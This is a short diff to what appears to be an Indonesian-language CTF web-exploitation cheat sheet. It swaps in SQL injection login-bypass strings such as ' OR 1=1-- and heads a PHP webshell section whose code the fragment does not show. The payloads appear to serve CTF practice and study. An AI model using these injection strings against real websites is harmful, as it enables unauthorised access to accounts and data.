@@ -10,9 +10,13 @@ Kategori Web Exploitation:
 # Kode
 SQL Injection
 ```sql
-' OR 1=1 OR '1'='1
+' OR 1=1--
 ```
 
+Modified SQL Injection (by me)
+```sql
+' OR 1=1 OR '1'='1
+```
 PHP Webshell (Execute Linux Command) dari [joswr1ght](gist.github.com/joswr1ght).
 
 ```php
